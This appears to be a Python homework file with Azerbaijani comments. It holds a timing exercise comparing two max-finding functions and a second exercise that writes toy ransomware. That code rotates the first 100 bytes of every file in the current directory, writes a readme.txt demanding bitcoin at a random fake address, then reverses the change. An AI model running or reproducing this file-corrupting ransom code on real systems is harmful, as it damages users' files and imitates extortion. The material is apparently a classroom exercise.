import random
import math
import timeit
import os

# Sual 1
# 1000 ədəd random yığılmış floatdan ibarət list hazırlayın. 
# Daha sonra girilən listin ən böyük elementini tapan 2 funksiya hazırlayın. 
# Birincisi parametrdəki listi sort edib, son elementi çıxarsın, 
# digəri isə bu əməliyyat üçün seçilmiş
# alqoritm (infinity ilə başlayan ilk dəyərə sahib alqoritm) ilə işləsin. 
# timeit ilə hazırladığınız iki funksiyanın sürətlərini ölçün

number_list = []
for i in range(50):
    r_num = random.uniform(1, 100)
    number_list.append(r_num)

def find_max1(num_list):
    num_list.sort()
    return num_list[-1]

def find_max2(num_list):
    max_num  = -math.inf
    for i in num_list:
        if i > max_num:
            max_num = i
    return max_num        

print(timeit.timeit('find_max1(number_list)', 'from __main__ import find_max1,number_list'))
print(timeit.timeit('find_max2(number_list)', 'from __main__ import find_max2,number_list'))


# Sual 3
# Olduğu direcotrydə olan bütün faylların ilk 100 baytını axırına ataraq həmin proqramları xarab edən bir proqram hazırlayın. 
# Həmin proqram həmçinin bir readme.txt çıxarsın ki, 
# əgər fayllarınızı qurtarmaq istəyirsinzə random verdiyiniz bir adresə bitcoin göndərin. 
# Daha sonra olduğu directorydəki faylları düzəltmək üçün son 100 baytı əvvələ qaytaran proqram hazırlayın.

for i in os.listdir(os.getcwd()):
    with open(i, 'rb') as f:
        content = f.read()
        result = content[100:] + content[:100]  

    with open(i, 'wb') as f1:
        f1.write(result) 

with open('readme.txt', 'w', encoding='utf-8') as f:
        card_address = ''
        for i in range(1,16):
            card_address += str(random.randint(1, 10))
        f.write(f'Əgər fayllarınızı qurtarmaq istəyirsinzə {card_address} bu adresə bitcoin göndərin.')     

for i in os.listdir():
    with open(i, 'rb') as f:
        content = f.read()
        result = content[-100:] + content[:-100]  

    with open(i, 'wb') as f1:
        f1.write(result)            

